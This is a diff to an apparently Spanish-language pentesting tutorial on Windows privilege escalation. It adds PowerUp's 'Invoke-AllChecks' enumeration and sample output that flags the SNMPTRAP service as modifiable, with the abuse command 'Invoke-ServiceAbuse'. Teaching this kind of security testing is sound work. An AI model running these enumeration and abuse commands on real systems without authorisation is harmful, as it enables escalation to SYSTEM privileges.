@@ -25,3 +25,17 @@ Y después podremos ejecutar *PowerUp*
 
 ### Enumerar servicios vulnerables
 Este tipo de enumeración nos va a permitir encontrar servicios vulnerables que tengan activos los parámetros `CanRestart: True`, `Modifiable Services` y `Unquoted Service Paths`, con funciones de abuso relacionadas para explotarlas
+```shell
+Invoke-AllChecks
+```
+
+Vemos varios servicios vulnerables pero en este caso elegimos uno que tenga `CanRestart: True`
+```shell
+ServiceName   : SNMPTRAP
+Path          : C:\Windows\System32\snmptrap.exe
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
+CanRestart    : True
+Name          : SNMPTRAP
+Check         : Modifiable Services
+```
